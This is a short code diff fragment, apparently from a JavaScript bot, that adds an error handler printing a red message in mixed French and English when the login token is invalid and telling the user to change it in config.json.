+  if(err.toString().includes('Incorrect login details were provided'.red) || err.toString().includes('An invalid token was provided'.red)) {
+      console.log('Token invalid!\nChange ton token dans le config.json'.red)
+  }})
+    
